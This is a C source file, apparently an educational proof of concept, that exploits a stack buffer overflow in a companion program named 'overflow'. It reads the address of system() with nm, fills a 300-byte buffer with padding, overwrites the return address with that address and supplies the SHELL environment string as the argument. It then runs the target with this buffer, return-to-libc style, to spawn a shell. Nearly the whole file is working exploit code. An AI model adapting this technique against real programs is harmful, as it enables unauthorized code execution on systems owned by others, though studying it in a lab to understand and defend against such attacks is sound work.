#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFLEN 300

static void hexdump(void * buf, size_t siz)
{
    for (size_t i = 0; i < siz; ++i)
    {
        printf("0x%02X ", ((unsigned char *)buf)[i]);
        if ((i+1) % 10 == 0) printf("\n");
    }
}

static char *
run_command_and_capture_output(char const * const cmd)
{
    FILE *fp;
    char output[BUFSIZ];

    fp = popen(cmd, "r");
    if (fp == NULL) {
        return NULL;
    }
    if (fgets(output, sizeof(output), fp) != NULL) {
        return strdup(output);
    }
    pclose(fp);

    return NULL;
}

int main(int argc, char ** argv)
{
    char * mydir;
    char * system_fn_as_str;
    size_t * system_fn = (size_t *)0xDEADC0DE;
    char cmd_get_system_fn[BUFSIZ];
    char path_to_overflow[BUFSIZ];
    char exploit_buffer[BUFLEN + 4 /* first argument of function overflow() in overflow.c */
                               + 4 /* return address -> address of system() */
                               + 4 /* saved ebp (stack frame of the calling fn) */
                               + 4 /* first argument for system() */];

    if (argc != 1)
    {
        exit(1);
    }
    mydir = dirname(strdup(argv[0]));

    snprintf(cmd_get_system_fn, sizeof(cmd_get_system_fn),
             "nm %s/overflow | grep 'W system' | cut -d ' ' -f 1", mydir);
    printf("Executing $(%s) to get address of system()\n", cmd_get_system_fn);
    system_fn_as_str = run_command_and_capture_output(cmd_get_system_fn);
    if (system_fn_as_str == NULL)
    {
        printf("Could not retrieve system() address.\n");
        exit(1);
    }
    system_fn = (size_t *)strtoul(system_fn_as_str, NULL, 16);

    snprintf(path_to_overflow, sizeof(path_to_overflow), "%s/%s",
             mydir, "overflow");
    printf("Exec......: %s\n"
           "system()..: %p\n"
           "env(SHELL): %p\n",
           path_to_overflow, system_fn, getenv("SHELL"));

    memset(exploit_buffer, 'A', sizeof(exploit_buffer));
    *(size_t **)&exploit_buffer[BUFLEN + 4] = system_fn;
    *(size_t **)&exploit_buffer[BUFLEN + 4 + 4 + 4] = (size_t *)(getenv("SHELL") + strlen("SHELL"));

    printf("\nexploit buffer:\n");
    hexdump(exploit_buffer, sizeof(exploit_buffer));
    printf("\n\n");

    printf("All set up, let's have some fun.\n"
           "Executing %s with exploit buffer as argv[1]\n",
           path_to_overflow);
    execl(path_to_overflow, path_to_overflow, exploit_buffer, NULL);
}
